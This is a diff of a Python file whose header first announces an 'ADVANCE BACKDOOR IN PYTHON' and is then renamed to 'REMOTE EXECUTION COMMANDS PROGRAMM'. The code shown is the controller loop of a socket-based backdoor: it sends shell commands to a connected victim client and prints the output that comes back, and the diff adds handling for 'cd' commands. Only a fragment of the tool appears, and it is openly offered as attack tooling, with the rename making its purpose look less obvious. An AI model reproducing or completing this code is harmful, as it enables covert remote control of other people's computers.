@@ -1,18 +1,20 @@
-								## ============== ADVANCE BACKDOOR IN PYTHON ================= ##
-					    			## ============== WITH MANY PROPERTISE ============= ##
+								## ============== REMOTE EXECUTION COMMANDS PROGRAMM ================= ##
+					    				## ============== WITH MANY PROPERTISE ============= ##
 					   
 
-		                                   #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
+			                                   #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
 
-		                                            ########    ### ##
-		                                            ###   ##    ###    ## 
-		                                            ########    ###       ##
-		                                            ###         ###         ##    
-		                                            ########    ###        ##
-		                                            ###   ##    ###     ##
-		                                            ########    ### ##
-		                                                        
-		                                    #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
+			                                            ### ##       ### ##
+			                                            ###    #     ###    ## 
+			                                            ###    #     ###       ##
+			                                            ### # #      ###         ##    
+			                                            ### ##       ###          ##
+	 		                                            ###    #     ###          ##
+			                                            ###     #    ###        ##
+			                                            ###     #    ###     ##
+			                                            ### # #      ### ##
+			                                                        
+			                                    #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
 #!/user/bin/python
 import socket
 import json   # This library is taken ,because through this you can send and get as many as bytes of data as you want from the client.  
@@ -39,6 +41,10 @@ def Shell():
 		reliable_send(command)
 		if command=="q":
 			break
+
+		elif command[:2] =="cd" and len(command) > 1:
+			continue
+
 		else:
 			result=reliable_recv()
 			print(result)
